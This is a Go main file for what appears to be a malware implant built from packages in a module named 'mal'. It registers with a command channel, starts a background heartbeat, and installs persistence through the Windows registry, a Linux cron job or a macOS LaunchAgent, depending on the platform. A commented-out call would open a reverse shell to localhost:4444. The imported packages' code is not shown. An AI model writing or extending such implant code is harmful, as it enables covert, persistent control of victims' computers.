package main

import (
	communications "mal/comms"
	"mal/persistence"
	//"mal/reverse"
	"runtime"
)

func main() {

	communications.Register()
	go communications.Heartbeat()

	if runtime.GOOS == "windows" {
		persistence.AddToRegistry()
	} else if runtime.GOOS == "linux" {
		persistence.AddToCron()
	} else if runtime.GOOS == "darwin" {
		persistence.AddToLaunchAgent()
	}

	select {}
	//reverse.StartReverseShell("localhost:4444")
}
